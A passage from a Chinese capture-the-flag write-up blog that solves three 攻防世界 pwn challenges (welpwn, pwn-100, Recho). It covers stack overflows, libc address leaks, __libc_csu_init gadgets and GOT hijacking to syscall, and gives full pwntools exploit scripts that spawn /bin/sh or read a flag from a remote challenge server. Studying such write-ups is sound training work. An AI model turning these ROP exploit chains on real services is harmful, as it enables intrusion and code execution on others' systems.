class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload2)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"><a class="markdownIt-Anchor" href="#攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"></a> 攻防世界-pwn-welpwn-泄露write函数地址构建rop链接</h1>
+<p>1.先检查程序，只开启了nx</p>
+  <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115205088.png" srcset="/img/loading.gif" lazyload alt="image-20210413115205088" style="zoom:67%;">                
+<p>2.用ida打开程序进行分析，主函数如下</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115228251.png" srcset="/img/loading.gif" lazyload alt="image-20210413115228251" style="zoom:67%;">
+<p>主函数会调用一个叫echo的函数，把输入buf传入，echo函数如下</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115252303.png" srcset="/img/loading.gif" lazyload alt="image-20210413115252303" style="zoom:67%;">
+<p>此函数把传入的字符串依次复制给局部变量s2，直到0停止，注意到这里s2只有16个长度，可能会存在溢出，但是因为这里遇到\00会停止循环，不能直接构造rop链</p>
+<p>通过调试，输入24个A的内存空间如下</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115320597.png" srcset="/img/loading.gif" lazyload alt="image-20210413115320597" style="zoom:67%;">
+<p>这两个栈是连续的，可以看成是这样的结构</p>
+<p>0x10  s2  A * 16      0x38 buf  A * 8</p>
+<p>0x18  s2  A*8       0x40 返回地址？</p>
+<p>0x28    返回地址</p>
+<p>0x30 buf  A*16</p>
+<p>思路：首先我们输入的地址里不能存在\00，否则就不能读入到s2，因为栈是连续的，如果想要执行我们构造的rop链，就得跳过前面输入的0x18个长度的数据，可以寻找一个存在4个pop指令的地址，如下图0x40089c的位置就有4个连续的pop指令</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214630486.png" srcset="/img/loading.gif" lazyload alt="image-20210413214630486"></p>
+<p>这样我们可以构造这样的栈空间,就可以执行我们需要的函数了</p>
+<p>0x10  s2  A*16      0x38 buf  A*8</p>
+<p>0x18  s2  A*8       0x40 pop_4</p>
+<p>0x28    pop_4      0x48 pop_rdi</p>
+<p>0x30 buf  A*16      0x50 got</p>
+<p>此题我们开始没有给出libc的版本，所以我们先泄露write的地址，先找到一个pop_rdi的地址为0x4008a3</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115639822.png" srcset="/img/loading.gif" lazyload alt="image-20210413115639822" style="zoom:67%;">
+<p>先写出一个泄露write地址的脚本，便于判断libc版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#泄露write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br></code></pre></td></tr></table></figure>
+<p>得到write的地址为0x7f0e5b3c72b0，用后三位2b0查找libc的版本可以知道是2.23</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214825951.png" srcset="/img/loading.gif" lazyload alt="image-20210413214825951"></p>
+<p>最后构建payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr) <br><span class="hljs-comment">#构建put函数的rop链，泄露write函数的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#获取write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br>libc=ELF(<span class="hljs-string">&quot;libc6_2.23.so&quot;</span>)<br>libc_write=libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]   <br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_binsh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#获取libc的基地址，用得到的write地址减去libc里write的地址</span><br>libc_base = write_addr - libc_write<br><span class="hljs-comment">#获取system地址  </span><br>system_addr = libc_base + libc_system  <br><span class="hljs-comment">#获取/bin/sh地址  </span><br>binsh_addr = libc_base + libc_binsh  <br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)  <br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br><span class="hljs-comment">#构建rop链，执行system（/bin/sh）</span><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-pwn100-3个参数的万能rop链"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn100-3个参数的万能rop链"></a> 攻防世界-pwn-pwn100-3个参数的万能rop链</h1>
+<p>1.首先检查程序，只开启了nx保护</p>
+<p>​                     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214930924.png" srcset="/img/loading.gif" lazyload alt></p>
+<p>2.使用ida进行分析</p>
+<p>主函数</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214955997.png" srcset="/img/loading.gif" lazyload alt="image-20210413214955997" style="zoom:67%;">
+<p>Sub_40068E()</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215015084.png" srcset="/img/loading.gif" lazyload alt="image-20210413215015084" style="zoom:67%;">
+<p>Sub_40063D()</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215033863.png" srcset="/img/loading.gif" lazyload style="zoom:67%;">
+<p>可以看出这是一个for循环，每次都向v1的位置读取输入1个字节，i不能超过200</p>
+<p>这里查看v1的栈空间只有0x40，可以进行栈溢出</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215105959.png" srcset="/img/loading.gif" lazyload alt="image-20210413215105959" style="zoom:67%;">
+<p>再查看函数，存在puts和read，可以进行泄露，由于没有/bin/sh，所以我们得寻找一个数据段进行写入，用gdb查看内存段权限，发现0x00600e10到   0x00601068是可以进行读写的。</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215131810.png" srcset="/img/loading.gif" lazyload alt="image-20210413215131810" style="zoom:67%;">
+<p>然后继续用ida查看此内存段，发现0x00600e10到0x601068处可以进行写入，用ida查看此处，发现在0x601040处有数据段可以使用此地址写入/bin/sh</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215149078.png" srcset="/img/loading.gif" lazyload alt="image-20210413215149078" style="zoom:67%;">
+<p>我们可以使用程序中的read函数进行写入，read函数有3个参数，这时我们需要一个万能的Gadget进行传参，教程如https://xz.aliyun.com/t/5597，如下图，此程序中也存在__libc_csu_init()这样的函数</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215216727.png" srcset="/img/loading.gif" lazyload alt="image-20210413215216727" style="zoom:67%;">
+<p>如图，先从 0x40075A 开始执行，将 rbx/rbp/r12/r13/r14/r15 这六个寄存器全部布置好，再 ret 到 0x400740 ，继续布置 rdx/rsi/rdi，最后通过 call qword ptr[r12+rbx*8] 执行目标函数。</p>
+<p>这个通用 Gadget 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 got 表项）来控制目标函数，还可以控制目标函数的最多三个入参（rdi/rsi/rdx）的值。此外，只要设置 rbp=rbx+1而且栈空间足够，这个 Gadget 可以一直循环调用下去。栈的结构类似下图（原网页的图，第一个0x40061A对应该程序的0x40075A，0x400600对应该程序的0x400740.）</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215235442.png" srcset="/img/loading.gif" lazyload alt="image-20210413215235442" style="zoom:67%;">
+<p>所以这里可以使用这个gadget构建read函数向.bss段写入/bin/sh</p>
+<p>由于是64位程序，还要找到一个pop rdi的地址是0x400763</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215305789.png" srcset="/img/loading.gif" lazyload alt="image-20210413215305789" style="zoom:67%;">
+<p>Payload脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./pwn-100&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn-100&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;37423&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop_6 = <span class="hljs-number">0x040075A</span><br>mov_3 = <span class="hljs-number">0x0400740</span><br>start = <span class="hljs-number">0x0400550</span><br><br><span class="hljs-comment">#构造rop链，泄露puts函数真实地址</span><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)<br>payload1 = payload1.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\x0a&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#把接收末尾的\0a替换为\00</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br><br><span class="hljs-comment">#用偏移量计算程序中的地址</span><br>libc_puts=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br><br><span class="hljs-comment">#用read函数向0x601040写入</span><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_6) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(read_got) + p64(<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x601040</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#Gadget 需要布置六个寄存器（rbx/rbp/r12/r13/r14/r15）加一个 ret 返回地址，x64 下至少需要 56 个字节的栈空间</span><br><span class="hljs-comment">#所以mov_3之后的需要56个字节才能到返回到start</span><br>payload2 += p64(mov_3) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(start) <br>payload2 = payload2.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload2)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br><span class="hljs-comment">#写入/bin/sh</span><br>p.send(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment">#构造rop链进行getshell</span><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x601040</span>) + p64(system_addr) <br>payload3 = payload3.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-recho-构造系统调用劫持got表"><a class="markdownIt-Anchor" href="#攻防世界-pwn-recho-构造系统调用劫持got表"></a> 攻防世界-pwn-Recho-构造系统调用劫持got表</h1>
+<p>1.首先看一下程序的保护机制，只开启了NX保护</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220457874.png" srcset="/img/loading.gif" lazyload alt="image-20210413220457874" style="zoom:67%;">              
+<p>2.然后使用ida分析 ，主函数如下</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220516158.png" srcset="/img/loading.gif" lazyload alt="image-20210413220516158" style="zoom:67%;">
+<p>可以看出，程序会先读取我们输入的数字，然后我们输入这个长度的字符串，然后程序会进行输出，然后我们注意到字符串里有一个flag，可能之后会用到</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220534899.png" srcset="/img/loading.gif" lazyload alt="image-20210413220534899" style="zoom:67%;">
+<p>首先我们要考虑的是结束主函数的循环，pwntools里有一个shutdown的功能，可以用这个功能结束循环，但是就不能重新rop到主函数进行获取输入了，我们必须一次性完成所有操作。</p>
+<p>由于要一次性完成操作，所以不能用之前的泄露地址的方法，这里因为数据段中存在flag，像open，write，read，alarm之类函数都存在系统调用（syscall）所以我们可以利用这个，可以直接抓取flag然后打印出来</p>
+<p>故我们需要构造一个这样的代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,READONLY); <br><span class="hljs-built_in">read</span>(fd,buf,<span class="hljs-number">100</span>); <br><span class="hljs-built_in">printf</span>(buf); <br></code></pre></td></tr></table></figure>
+<p>用gdb动态调试时对alarm进行分析</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220620011.png" srcset="/img/loading.gif" lazyload alt="image-20210413220620011" style="zoom:67%;">
+<p>偏移为5的位置存在syscall,所以我们要进行劫持got表，首先我们得用</p>
+<p>ROPgadget找到几个需要用到的构造代码</p>
+<p>1.pop_rdi_ret=0x4008a3</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220641797.png" srcset="/img/loading.gif" lazyload alt="image-20210413220641797" style="zoom:67%;">
+<p>2.pop_rax_ret=0x4006fc</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220701351.png" srcset="/img/loading.gif" lazyload alt="image-20210413220701351" style="zoom:67%;">
+<p>3.add_rdi_ret = 0x40070d</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413220732971.png" srcset="/img/loading.gif" lazyload alt="image-20210413220732971"></p>
+<p>所以劫持alarm的got表的构造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># alarm() ---&gt; syscall</span><br><span class="hljs-comment"># alarm_got = alarm_got + 0x5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rdi = alarm_got</span><br>payload += p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br></code></pre></td></tr></table></figure>
+<p>第二步：构造fd = open(“flag”,READONLY)，由于open的系统调用号为2，所以把rax设置为2后调用syscall即可调用open()，ida中flag的地址为0x601058</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220815449.png" srcset="/img/loading.gif" lazyload alt="image-20210413220815449" style="zoom:67%;">
+<p>还需要一个pop_rsi_ret = 0x4008a1</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220835212.png" srcset="/img/loading.gif" lazyload alt="image-20210413220835212"></p>
+<p>所以构造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br></code></pre></td></tr></table></figure>
+<p>第三步：构造read(fd,buf,100)，可以直接把flag文件打开，并且存放到一个可以读写的位置，因为.bss段是可以读写的，所以我们需要一个地址存储读出来的flag，这里我们选择buf=0x601068</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220907110.png" srcset="/img/loading.gif" lazyload alt="image-20210413220907110" style="zoom:67%;">
+<p>还需要一个pop_rdx_ret = 0x4006fe</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220925801.png" srcset="/img/loading.gif" lazyload alt="image-20210413220925801" style="zoom:67%;">
+<p>所以构造如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 